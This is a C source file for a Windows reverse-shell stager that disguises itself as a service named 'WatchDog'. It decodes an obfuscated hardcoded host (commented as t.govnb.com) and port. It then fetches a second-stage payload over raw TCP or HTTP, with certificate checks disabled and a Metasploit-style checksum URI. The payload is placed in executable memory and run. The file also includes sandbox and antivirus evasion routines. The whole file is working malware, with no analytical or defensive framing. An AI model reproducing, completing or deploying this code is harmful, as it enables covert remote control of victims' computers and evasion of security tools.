#define _CRT_SECURE_NO_WARNINGS 
#include <WinSock2.h> //must be first cuz MACRO redefine
#include <Wininet.h>
//#include <winhttp.h>
#include <Windows.h>
#include <stdio.h>
#include <stdarg.h> //fucking va_XXXX
//#include "WinHttpClient.h"

#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib, "WinInet.lib")
//#pragma comment(lib, "winhttp.lib")

#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#pragma comment(linker,"/MERGE:.rdata=.text")

//fucking service define

char szServiceName[] = "WatchDog";
BOOL bInstall;
SERVICE_STATUS_HANDLE hServiceStatus;
SERVICE_STATUS status;
DWORD dwThreadID;


//const char RHOST[64] = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
//const char RPORT[6] = "XXXXX";

//DEBUG MACRO from - http://www.cnblogs.com/ziwuge/archive/2011/10/31/2230326.html
#define MAXDUGBUFF 20
#define OutError(ErrorEvent){	\
char DebugChar[MAXDUGBUFF];	\
ZeroMemory(DebugChar, MAXDUGBUFF * sizeof(char));	\
sprintf(DebugChar, "%s  Error(%d) at line(%d)\n", ErrorEvent, GetLastError(), __LINE__);	\
OutputDebugString(DebugChar);	\
}


// Globals ...
unsigned long uIP;
unsigned short sPORT;
unsigned char *buf;
unsigned int bufSize;

//winhttp
const DWORD INT_BUFFERSIZE = 1024 * 10;

//======
/*
char* RHOST = "xh5ox€yn;q~}"; //for the - sb.govnb.com
char* RPORT = "9::"; //home is 3389 for the - 443
char* RHPORT = "=6"; //for the - 80
char* XPORT = ":9"; //x64 for the tcp- 53
char* XHPORT = ">?:"; //x64 for the http - 993
*/

//======
char* RHOST = "y4nwxm:p}|"; //for the - t.govnb.com
char* RPORT = ":9"; //for the - 53
char* RHPORT = "9::"; //for the - 443


//====sec_config
char* host;
char* port;


//int 1 = crypt , int 2 = decrypt
char* sec_config(int method, char* data)
{
	int i;
	char tmp[128] = { '\0' };
	int len = strlen(data);
	for (i = 0; i < len; i++)
	{
		if (method == 1)
		{
			tmp[i] = data[i] + i + 5;
		}
		else
		{
			tmp[i] = data[i] - i - 5;
		}
	}
	tmp[i] = '\0';
	return tmp;
}

/*
//this function simply generates a random number between min/max, with fairly even distribution
int random_in_range(unsigned int min, unsigned int max)
{
	
	if (RAND_MAX == base_random){
		return random_in_range(min, max);
	}
	
	int range = max - min,
		remainder = RAND_MAX % range,
		bucket = RAND_MAX / range;
	
	if (base_random < RAND_MAX - remainder) {
		return min + base_random / bucket;
	}
	else {
		return random_in_range(min, max);
	}
}

void genlol(){
	int num1, num2, num3;
	num1 = 100;
	while (num1 <= 5) {
		num1 = random_in_range(0, 10000);
		num2 = random_in_range(0, 10000);
		num3 = random_in_range(0, 10000);
	}
}

void run_self()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char szPath[MAX_PATH];

	GetModuleFileName(NULL, szPath, MAX_PATH);
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(NULL, szPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}


char* WcharToChar(wchar_t* orig){
	size_t convertedChars = 0;
	size_t origsize = wcslen(orig) + 1;
	const size_t newsize = origsize * 2;
	char *nstring = (char*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
	wcstombs(nstring, orig, origsize);
	return nstring;
}


wchar_t* CharToWchar(char* orig){
	size_t newsize = strlen(orig) + 1;
	wchar_t * wcstring = (wchar_t*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
	mbstowcs(wcstring, orig, newsize);
	return wcstring;
}

*/

void gen_random(char* s, const int len) { // ripped from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}


int TextChecksum8(char* text)
{
	UINT temp = 0;
	for (UINT i = 0; i < strlen(text); i++)
	{
		temp += (int)text[i];
	}
	return temp % 0x100;
}

unsigned char* reverse_http(char* host, char* port, bool WithSSL){

	// Variables
	char URI[5] = { 0 };			//4 chars ... it can be any length actually.
	char FullURL[6] = { 0 };	// FullURL is ("/" + URI)
	unsigned char* buffer = nullptr;
	DWORD flags = 0;
	int dwSecFlags = 0;

	
	int checksum = 0;
	srand(GetTickCount());
	while (true)
	{
		gen_random(URI, 4);
		checksum = TextChecksum8(URI);
		if (checksum == 92)
		{
			break; 
		}
	}
	strcpy(FullURL, "/");
	strcat(FullURL, URI);

	
	if (WithSSL) {
		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA);
	}
	else {
		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI);
	}

	
	

	
	HINTERNET hInternetOpen = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	if (hInternetOpen == NULL){
		OutError("InternetOpen()");
	}


	//fucking test
	HINTERNET hInternetConnect = InternetConnect(hInternetOpen, host, atoi(port), NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	if (hInternetConnect == NULL){
		OutError("InternetConnect()");
	}

	
	
	HINTERNET hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", FullURL, NULL, NULL, NULL, flags, NULL);
	if (hHTTPOpenRequest == NULL){
		OutError("HttpOpenRequest()");
	}

	if (WithSSL){
		dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
		InternetSetOption(hHTTPOpenRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
	}


	if (!HttpSendRequest(hHTTPOpenRequest, NULL, NULL, NULL, NULL))
	{
		OutError("HttpSendRequest()");
	}

	buffer = (unsigned char*)VirtualAlloc(NULL, (4 * 1024 * 1024), MEM_COMMIT, PAGE_EXECUTE_READWRITE);


	BOOL bKeepReading = true;
	DWORD dwBytesRead = -1;
	DWORD dwBytesWritten = 0;
	while (bKeepReading && dwBytesRead != 0)
	{
		bKeepReading = InternetReadFile(hHTTPOpenRequest, (buffer + dwBytesWritten), 4096, &dwBytesRead);
		dwBytesWritten += dwBytesRead;
	}


	return buffer;
}


//convert shit

bool UnicodeToAnsi(wchar_t* lpString, char* szAnsi)//(in,out)
{
	char* pWideCharStr;
	int nLenOfWideChar, nReturnlen;
	nLenOfWideChar = WideCharToMultiByte(CP_ACP, 0, lpString, -1, NULL, 0, NULL, NULL);
	//Header: Declared in Winnls.h; include Windows.h.
	if (!nLenOfWideChar)
		return false;
	pWideCharStr = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nLenOfWideChar + 1);
	nReturnlen = WideCharToMultiByte(CP_ACP, 0, lpString, -1, pWideCharStr, nLenOfWideChar, NULL, NULL);
	if (!nReturnlen)
	{
		HeapFree(GetProcessHeap(), 0, pWideCharStr);
		return false;
	}
	strcpy(szAnsi, pWideCharStr);
	HeapFree(GetProcessHeap(), 0, pWideCharStr);
	return true;
}


unsigned char* reverse_tcp(char* rhost, char* rport)
{

	WSADATA wsaData;

	SOCKET sckt;
	SOCKET buffer_socket;

	struct sockaddr_in server;
	hostent *hostName;
	int length = 0;
	int location = 0;
	while (true)
	{
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
			OutError("WSAStartup");
			WSACleanup();
			exit(-1);
		}

		hostName = gethostbyname(rhost);

		if (hostName == nullptr){
			OutError("gethostbyname");
			continue;
		}

		uIP = *(unsigned long*)hostName->h_addr_list[0];
		sPORT = htons(atoi(rport));

		server.sin_addr.S_un.S_addr = uIP;
		server.sin_family = AF_INET;
		server.sin_port = sPORT;

		sckt = socket(AF_INET, SOCK_STREAM, NULL);

		if (sckt == INVALID_SOCKET){
			OutError("socket()");
			closesocket(sckt);
			WSACleanup();
			continue;
		}


		if (connect(sckt, (sockaddr*)&server, sizeof(server)) != 0){
			OutError("connect()");
			closesocket(sckt);
			WSACleanup();
			Sleep(3000);
			continue;
		}

		buffer_socket = sckt;


		recv(buffer_socket, (char*)&bufSize, 4, 0); // read first 4 bytes = stage size

		buf = (unsigned char*)VirtualAlloc(buf, bufSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		buf[0] = 0xbf; // opcode of "mov edi, [WhateverFollows]
		memcpy(buf + 1, &buffer_socket, 4); // got it?

		length = bufSize;
		while (length != 0){
			int received = 0;
			received = recv(buffer_socket, ((char*)(buf + 5 + location)), length, 0);
			location = location + received;
			length = length - received;
		}
		//////////////////////////////
		return buf;

	}//while
}




//Evade the sandbox
int sandbox_evasion(){
	//================================
	//begin sandbox evasssioooooon
	MSG msg;
	DWORD tc;
	//check to see if the application is fully loaded, apparently AV hates peekmessage
	//see this post for more info http://schierlm.users.sourceforge.net/avevasion.html
	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
		return -1;
	if (msg.message != WM_USER + 2 || msg.wParam != 23 || msg.lParam != 42)
		return -1;
	//record the ticks, then sleep, then count the ticks.... this verifies that we actually slept for 650
	//this helps burn out the clock on the sandboxing, or detect if sandboxing is converting sleeps to nops
	tc = GetTickCount();
	Sleep(650);
	if (((GetTickCount() - tc) / 300) != 2)
		return -1;
	//=================================
	return 0;
}



void LogEvent(LPCTSTR pFormat, ...)
{
	TCHAR    chMsg[256];
	HANDLE  hEventSource;
	LPTSTR  lpszStrings[1];
	va_list pArg;

	va_start(pArg, pFormat);
	vsprintf(chMsg, pFormat, pArg);
	va_end(pArg);
	

	lpszStrings[0] = chMsg;

	hEventSource = RegisterEventSource(NULL, szServiceName);
	if (hEventSource != NULL)
	{
		ReportEvent(hEventSource, EVENTLOG_INFORMATION_TYPE, 0, 0, NULL, 1, 0, (LPCTSTR*)&lpszStrings[0], NULL);
		DeregisterEventSource(hEventSource);
	}
}

void WINAPI ServiceStrl(DWORD dwOpcode)
{
	switch (dwOpcode)
	{
	case SERVICE_CONTROL_STOP:
		status.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(hServiceStatus, &status);
		PostThreadMessage(dwThreadID, WM_CLOSE, 0, 0);
		break;
	case SERVICE_CONTROL_PAUSE:
		break;
	case SERVICE_CONTROL_CONTINUE:
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		break;
	default:
		LogEvent("Bad service request");

	}
}

void Init()
{
	hServiceStatus = NULL;
	status.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
	//status.dwServiceType = SERVICE_WIN32;
	status.dwCurrentState = SERVICE_START_PENDING;
	status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	//status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_PAUSE_CONTINUE;
	status.dwWin32ExitCode = 0;
	status.dwServiceSpecificExitCode = 0;
	status.dwCheckPoint = 0;
	status.dwWaitHint = 0;
}

void WINAPI ServiceMain()
{
	// Register the control request handler
	//status.dwCurrentState = SERVICE_START_PENDING;
	//status.dwControlsAccepted = SERVICE_ACCEPT_STOP;

	//注册服务控制
	hServiceStatus = RegisterServiceCtrlHandler(szServiceName, ServiceStrl);
	if (hServiceStatus == NULL)
	{
		LogEvent("Handler not installed");
		return;
	}
	SetServiceStatus(hServiceStatus, &status);

	status.dwWin32ExitCode = S_OK;
	status.dwCheckPoint = 0;
	status.dwWaitHint = 0;
	status.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(hServiceStatus, &status);


	

	//模拟服务的运行。应用时将主要任务放于此即可
	//可在此写上服务需要执行的代码，一般为死循环
	
	while (1)
	{
		host = sec_config(2, RHOST);
		
		#ifdef ISX64
		port = sec_config(2, XPORT);
		buf = reverse_tcp_x64(host, port);
		#else
		port = sec_config(2, RPORT);
		buf = reverse_tcp(host, port);
		#endif
		(*(void(*)())buf)();
	}
	status.dwCurrentState = SERVICE_STOPPED;
	SetServiceStatus(hServiceStatus, &status);
	
	
}

/*
bool IsProcessRunAsAdmin()
{
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;

	BOOL  b = AllocateAndInitializeSid(
		&NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&AdministratorsGroup);

	if (b)
	{
		CheckTokenMembership(NULL, AdministratorsGroup, &b);
		FreeSid(AdministratorsGroup);
	}

	return  b == TRUE;
}
*/




//fucking main
int main()
{
	sandbox_evasion();

	//services from - http://blog.csdn.net/liuzhihan209/article/details/8763266

	Init();

	dwThreadID = ::GetCurrentThreadId();

	SERVICE_TABLE_ENTRY st[] =
	{
		{ szServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
		{ NULL, NULL }
	};

	if (!StartServiceCtrlDispatcher(st))
	{
		LogEvent("Register Service Main Function Error!");
	}
	/*
	if (IsProcessRunAsAdmin())
	{
		run_self();
		exit(1);
	}
	*/
	
	host = sec_config(2, RHOST);
	port = sec_config(2, RHPORT);
	buf = reverse_http(host, port , false);
	(*(void(*)())buf)();
	
	return 0;
	
}